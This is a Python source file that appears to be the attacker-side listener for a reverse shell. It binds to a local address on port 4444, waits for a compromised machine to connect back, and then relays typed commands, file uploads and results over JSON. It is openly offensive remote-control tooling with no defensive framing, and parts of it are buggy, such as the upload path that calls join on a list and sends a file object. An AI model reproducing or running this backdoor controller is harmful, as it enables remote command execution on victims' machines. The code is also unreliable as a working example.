import socket
import json
import base64
import subprocess

class Listener:
    #constructor
    def __init__(self, ip, port):
        listener=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] waiting for connections")
        self.connection, address = listener.accept()
        print("[+]connection Established" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def executeCommand(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    # def write_file(self, path, content):
    #     with open(path, "wb") as file:
    #         file.write(base64.b64decode(content))
    #         return "[+] Download Successfully."

    # def read_file(self, path):
    #     with open(path, "rb") as file:
    #         return base64.b64encode(file.read())

    def uploadfile(self, filename):
        f = open(filename, "r")
        return ["upload", filename, f]

    def run(self):
        # p = subprocess.Popen("echo %cd%", stdout=subprocess.PIPE)
        # result = p.communicate()[0]
        # command = input("{} >>".format(result))
        while True:
            command = input("Enter command >> ")
            comm = command.split(" ")
            if comm[0] == "upload":
                commands = self.uploadfile(comm[1])
                self.reliable_send(commands.join(",").encode())
            self.reliable_send(command)
            print(self.reliable_receive())



my_listener= Listener(("192.168.0.108"), 4444)
my_listener.run()



